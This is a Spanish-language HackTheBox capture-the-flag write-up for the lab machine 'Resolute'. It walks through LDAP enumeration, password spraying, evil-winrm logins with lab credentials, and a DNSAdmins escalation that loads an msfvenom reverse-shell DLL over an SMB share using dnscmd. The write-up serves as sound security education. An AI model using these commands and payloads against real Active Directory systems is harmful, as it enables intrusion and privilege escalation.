---
title: HTB Resolute Write-up (Español)
tags: [HackTheBox, Active Directory,DNSAdmins]
image: /assets/images/Resolute/1__50mbX____satzMUETrLrTh6w.png
published: true
banner: true
---

I cloned my writeup that was originally posted on [medium](https://medium.com/@5ubterranean/htb-resolute-write-up-espa%C3%B1ol-57ba05034b5b)

Resolute en una máquina basada en Windows que estuvo activa desde el 7 de Diciembre del 2019 hasta el 30 de mayo del 2020, en este caso empezaremos enumerando LDAP ya que nos encontramos en un ambiente con AD, el administrador de la red no parecía tener buenas prácticas y dejó una contraseña dentro del campo de descripción de uno de los usuarios, la contraseña no corresponde al usuario en el cual la encontramos por lo que hacemos una lista con todos los usuarios del dominio y usamos fuerza bruta, una vez tenemos el usuario correspondiente ya tenemos un acceso inicial a la máquina objetivo, mientras enumeramos la máquina nos encontramos con un script en powershell con la contraseña del usuario “ryan” adentro, aunque este se encontraba dentro unas carpetas ocultas, bueno no es que eso aumente la seguridad en algo, por último vemos que este usuario pertenece al grupo de “DNSAdmins”, esto es importante ya que nos permite hacer un estilo de DLL hijacking para elevar nuestros privilegios a System.

# Enumeración

Empezamos usando masscan para encontrar todos los puertos disponibles y luego usamos nmap para conseguir más información de los mismos.

```bash
masscan -e tun0 — rate=500 -p 0–65535 10.10.10.169  
nmap -sC -sV -p 139,59811,389,49666,49688,49664,49677,445,49676,49670,636,464,9389,53,593,47001,49667,88,49709,3269 -o scan.txt 10.10.10.169  
53/tcp    open   domain?  
| fingerprint-strings:   
|   DNSVersionBindReqTCP:   
|     version  
|\_    bind  
88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2020-04-20 13:27:23Z)  
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn  
389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)  
445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)  
464/tcp   open   kpasswd5?  
593/tcp   open   ncacn\_http   Microsoft Windows RPC over HTTP 1.0  
636/tcp   open   tcpwrapped  
3269/tcp  open   tcpwrapped  
9389/tcp  open   mc-nmf       .NET Message Framing  
47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|\_http-server-header: Microsoft-HTTPAPI/2.0  
|\_http-title: Not Found  
49664/tcp open   msrpc        Microsoft Windows RPC  
49666/tcp open   msrpc        Microsoft Windows RPC  
49667/tcp open   msrpc        Microsoft Windows RPC  
49670/tcp open   msrpc        Microsoft Windows RPC  
49676/tcp open   ncacn\_http   Microsoft Windows RPC over HTTP 1.0  
49677/tcp open   msrpc        Microsoft Windows RPC  
49688/tcp open   msrpc        Microsoft Windows RPC  
49709/tcp open   msrpc        Microsoft Windows RPC
```

Como se ve tenemos muchos puertos abiertos, pero la información más importante la obtendremos de LDAP, para esto usaremos ldapsearch, empezamos haciendo una petición para obtener los naming contexts disponibles, principalmente buscamos el nombre del dominio, para esto usamos `ldapsearch -h 10.10.10.169 -x -s base namingcontexts`.

![](/assets/images/Resolute/1__xmDicKLQr7hTQKk____IW4mQ.png)


Ahora confirmamos los resulta de nmap, que nos dijo que el dominio era megabank.local, ahora podríamos extraer todas las unidades organizacionales y sus elementos usando `ldapsearch -h 10.10.10.169 -x -b “DC=megabank,DC=local”`, pero terminaría siendo más información de la que necesitamos, algunos administradores de red asumen que solo ellos tienen acceso a los elementos de las unidades organizacionales, pero esto es erróneo ya que como estas se replican entren los dominios, esta información también es replicada, asumiendo este caso buscamos el campo más común donde encontrar información la descripción de los usuarios, para esto usamos ldapsearch para extraer solo las uninades que sean de tipo usuario y filtramos para solo ver el campo de descripción, para hacer esto ejecutamos: `ldapsearch -h 10.10.10.169 -x -b “DC=megabank,DC=local” ‘(objectClass=user)’ | grep description`

![](/assets/images/Resolute/1__rravMMDxtFxsVqlrTQsLRg.png)


# Ganando acceso

Muy bien nuestra suposición fue correcta, el administrador dejó una contraseña ahí, en este caso es “Welcome123!”, lo primero que intentamos fue usar esta contraseña junto con el usuario cuyo campo de descripción la tenía, pero no tuvimos éxito, así ahora procedimos a crear una lista de todos los usuarios dentro del dominio, una vez más con ayuda de ldapsearch: `ldapsearch -h 10.10.10.169 -x -b “DC=megabank,DC=local” '(objectClass=user)' | grep “sAMAccountName” | awk '{print $2}' > userlist.txt`.  
Y ahora ya que el puerto de SMB se encuentra abierto podemos usar crackmapexec para hacer un ataque de fuerza bruta y encontrar el usuario a quien le pertenece esta contraseña, para esto usamos: `cme smb 10.10.10.169 -u userlist.txt -p 'Welcome123!'`.

![](/assets/images/Resolute/1__S84WWyrNbsluQcWgJfR3DA.png)


Bien el usuario a quien le pertenece la contraseña es “melanie”, ahora usamos evil-winrm para conseguir una shell en la máquina objetivo: `evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!'`.

![](/assets/images/Resolute/1__Wlz1T7dFdtSyUeQHi98sZQ.png)


Y con esto hemos conseguido el “user.txt”.

# Movimiento lateral

Luego de usar los métodos básicos de enumeración (winpeas, revisar servicios, permisos, grupos, etc.) no encontramos nada útil, así que empezamos a buscar manualmente por información, y revisando el directorio raíz del disco local C, no encontramos con una carpeta oculta que llama nuestra atención (para listar archivos ocultos debemos usar el argumento -Force con Get-ChildItem), PSTranscripts.

![](/assets/images/Resolute/1__57iRWGsI64MvKgbkDJRblw.png)


Dentro de esa carpeta hay otra carpeta oculta llamada “20191203” y dentro de ella hay un script de powershell llamado “PowerShell\_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt”, dentro de este nos encontramos las credenciales del usuario “ryan”, parece que este quería automatizar algunas tareas, pero dejar tus credenciales en un archivo nunca es buena idea.

![](/assets/images/Resolute/1__k1DfsYze2mrxbdkLV4NV7Q.png)


Ya una vez con sus credenciales volvemos a usar evil-wirn para acceder como este usuario: `evil-winrm -i 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'`.

![](/assets/images/Resolute/1__x8W0TMRyEdLQ94cHML2onQ.png)


# Escalación de privilegios

Enumerando un poco el usuario vemos que este pertenece al grupo “DNSAdmins”, y luego de googlear un poco descubrimos que existe una forma de escalar privilegios con este grupo, para lograrlo primero creamos un dll con msfvenom que ejecutará un reverse shell, para esto usamos el comando: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.64 LPORT=54321 -f dll -o plugin.dll`, sería más comodo subir nuestro dll a la máquina objetivo, pero esta cuenta con un antivirus que lo detecta y elimina rápidamente, así que creamos una carpeta compartida con ayuda de impacket, `sudo python3 smbserver.py share /home/subterranean/writeups/resolute -smb2support`, iniciamos nuestro listener `nc -lvp 54321`, y ejecutamos el comando que importará nuestro plugin, dentedrá e iniciará el servicio de DNS, `cmd /c “dnscmd resolute.megabank.local /config /serverlevelplugindll \\10.10.15.64\share\plugin.dll & sc stop dns & ping -n 10 127.0.0.1 & sc start dns”`. En este caso lo iniciamos con `cmd /c` porque nos escontramos en una shell de powershell, y se unen los comandos con “&” para ejecutar todo en un one liner, al ejecutar el comando veremos que nos llega una petición a nuestro servidor SMB.

![](/assets/images/Resolute/1__yqpDTHZqrGSTxEPrGW1Rkg.png)


Y luego se detiene y se inicia el servicio.

![](/assets/images/Resolute/1__OvB1YaofKEJqF9TMqVZQZg.png)
![](/assets/images/Resolute/1__3rtgYKmXjiRhqGuDRxbD3g.png)


Y luego de eso obtendremos nuestra shell.

![](/assets/images/Resolute/1__Rw80__0jw3aZovvYIuA6iBw.png)


Y listo, conseguimos lo permisos de “nt authority\\system” y terminamos con la máquina.

# Descargo de responsabilidad

Todos los recursos brindados en este post se hicieron puramente con fines educativos y de concientización, el autor no se hace responsable por las acciones que las personas puedan realizar con el contenido del mismo.